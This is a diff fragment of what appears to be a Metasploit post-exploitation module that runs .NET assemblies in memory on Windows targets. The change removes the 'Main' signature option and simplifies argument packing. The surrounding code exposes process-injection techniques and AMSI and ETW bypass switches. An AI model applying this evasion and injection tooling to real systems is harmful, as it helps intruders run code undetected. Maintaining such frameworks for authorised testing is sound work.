@@ -12,11 +12,6 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::ReflectiveDLLInjection
   include Msf::Post::Windows::Dotnet
 
-  SIGNATURES = {
-    'Main()' => 1,
-    'Main(string[])' => 2
-  }.freeze
-
   def initialize(info = {})
     super(
       update_info(
@@ -65,7 +60,6 @@ class MetasploitModule < Msf::Post
         OptEnum.new('TECHNIQUE', [true, 'Technique for executing assembly', 'SELF', ['SELF', 'INJECT', 'SPAWN_AND_INJECT']]),
         OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-        OptEnum.new('Signature', [true, 'The Main function signature', 'Automatic', ['Automatic'] + SIGNATURES.keys]),
         OptBool.new('AMSIBYPASS', [true, 'Enable AMSI bypass', true]),
         OptBool.new('ETWBYPASS', [true, 'Enable ETW bypass', true]),
 
@@ -358,12 +352,7 @@ class MetasploitModule < Msf::Post
     assembly_size = File.size(exe_path)
 
     cln_params = ''
-    if datastore['Signature'] == 'Automatic'
-      signature = datastore['ARGUMENTS'].blank? ? SIGNATURES['Main()'] : SIGNATURES['Main(string[])']
-    else
-      signature = SIGNATURES.fetch(datastore['Signature'])
-    end
-    cln_params << datastore['ARGUMENTS'] if signature == SIGNATURES['Main(string[])'] && datastore['ARGUMENTS'].present?
+    cln_params << datastore['ARGUMENTS'] unless datastore['ARGUMENTS'].nil?
     cln_params << "\x00"
 
     pipe_name = pipe_name.encode(::Encoding::ASCII_8BIT)
@@ -377,8 +366,7 @@ class MetasploitModule < Msf::Post
       assembly_size,
       datastore['AMSIBYPASS'] ? 1 : 0,
       datastore['ETWBYPASS'] ? 1 : 0,
-      signature
-    ].pack('IIIIICCC')
+    ].pack('IIIIICC')
 
     payload = params
     payload += pipe_name
